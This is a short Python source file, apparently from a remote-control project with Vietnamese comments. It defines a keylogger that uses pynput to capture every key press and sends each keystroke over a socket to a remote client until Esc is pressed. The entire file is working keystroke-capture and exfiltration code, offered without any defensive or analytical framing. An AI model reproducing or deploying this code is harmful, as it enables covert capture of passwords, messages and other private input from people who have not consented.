# key_logger_server.py
from pynput import keyboard

def start_keylogger(client_socket):
       
    def on_press(key):
        if hasattr(key,'char') and key.char is not None:
            key_str = key.char # Lấy ký tự từ phím nhấn
        else :
            key_str = f' {str(key)}'
        #in ra các phím nhấn
        print(f'Key pressed:{key_str}')

        # Gửi dữ liệu phím nhấn qua client_socket
        try:
            client_socket.sendall(key_str.encode("utf-8"))
        except Exception as e:
            print(f'Error when sending data to client: {e}')
            return False  # Dừng keylogger nếu có lỗi khi gửi dữ liệu

    def on_release(key):
        # Dừng keylogger khi nhấn phím Esc
        if key == keyboard.Key.esc:                   
            return False      

    # Bắt đầu lắng nghe sự kiện phím nhấn và thả
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()  # Chờ cho listener hoàn thành
        except Exception as e:
                print(f"Error in listener: {e}")

    # Gửi thông báo đến client khi keylogger dừng
    client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))